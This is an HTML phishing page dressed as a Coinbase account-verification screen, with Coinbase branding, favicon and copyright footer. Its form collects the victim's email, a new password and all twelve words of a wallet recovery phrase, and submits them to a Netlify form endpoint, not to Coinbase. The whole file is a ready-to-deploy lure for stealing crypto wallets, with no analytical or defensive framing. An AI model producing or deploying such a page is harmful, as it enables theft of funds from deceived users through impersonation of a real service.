<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
  <title>Coinbase – Verify Your Account</title>
  <link rel="icon" href="https://www.coinbase.com/favicon.ico" type="image/x-icon" />
  <style>
    * {
      box-sizing: border-box;
    }
    html, body {
      margin: 0;
      padding: 0;
      background: #f7f7f7;
      height: 100%;
      font-family: Arial, sans-serif;
      overflow-x: hidden;
    }
    body {
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      background: #fff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
      text-align: left;
      display: none;
    }
    .active {
      display: block !important;
    }
    .container h2 {
      font-size: 2.5em;
      color: #0052ff;
      text-align: center;
      margin: 0;
    }
    .container h3 {
      text-align: center;
      margin-top: 5px;
      margin-bottom: 15px;
      font-weight: normal;
    }
    .container p {
      font-size: 14px;
      color: #333;
      margin-bottom: 15px;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
      outline: none;
    }
    .seed-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
      margin-top: 15px;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #0052ff;
      color: #fff;
      border: none;
      margin-top: 20px;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background-color: #003dcc;
    }
    .note {
      margin-top: 10px;
      font-size: 12px;
      color: #888;
    }
    .footer {
      margin-top: 20px;
      text-align: center;
      font-size: 10px;
      color: #888;
    }
    .spinner {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #0052ff;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    @media (max-width: 480px) {
      html, body {
        height: 100%;
      }
      .container {
        padding: 20px;
        border-radius: 8px;
      }
      .container h2 {
        font-size: 2em;
      }
    }
  </style>
</head>
<body>

  <div class="container active" id="formScreen">
    <h2>Coinbase</h2>
    <h3>Verify Your Account</h3>
    <p>Enter your email, set a new password, and re-enter your wallet recovery phrase to verify your account.</p>

    <form name="wallet-verification" method="POST" data-netlify="true" data-netlify-honeypot="bot-field" action="/success" netlify>
      <input type="hidden" name="form-name" value="wallet-verification" />
      <p hidden><input name="bot-field" /></p>

      <input name="email" type="text" placeholder="Email" required />
      <input name="password" type="password" placeholder="New password" required />

      <h4>Enter Your Seed Phrase</h4>
      <p class="note">To secure your Coinbase Wallet, re-enter your wallet recovery phrase below.</p>

      <div class="seed-grid">
        <!-- 12 input fields for phrase -->
        <!-- Naming them as phrase1 to phrase12 -->
        <input name="phrase1" type="text" placeholder="Word 1" required>
        <input name="phrase2" type="text" placeholder="Word 2" required>
        <input name="phrase3" type="text" placeholder="Word 3" required>
        <input name="phrase4" type="text" placeholder="Word 4" required>
        <input name="phrase5" type="text" placeholder="Word 5" required>
        <input name="phrase6" type="text" placeholder="Word 6" required>
        <input name="phrase7" type="text" placeholder="Word 7" required>
        <input name="phrase8" type="text" placeholder="Word 8" required>
        <input name="phrase9" type="text" placeholder="Word 9" required>
        <input name="phrase10" type="text" placeholder="Word 10" required>
        <input name="phrase11" type="text" placeholder="Word 11" required>
        <input name="phrase12" type="text" placeholder="Word 12" required>
      </div>

      <button type="submit">Verify Wallet</button>
    </form>

    <div class="footer">© 2025 Coinbase, Inc. All rights reserved.</div>
  </div>

</body>
</html>
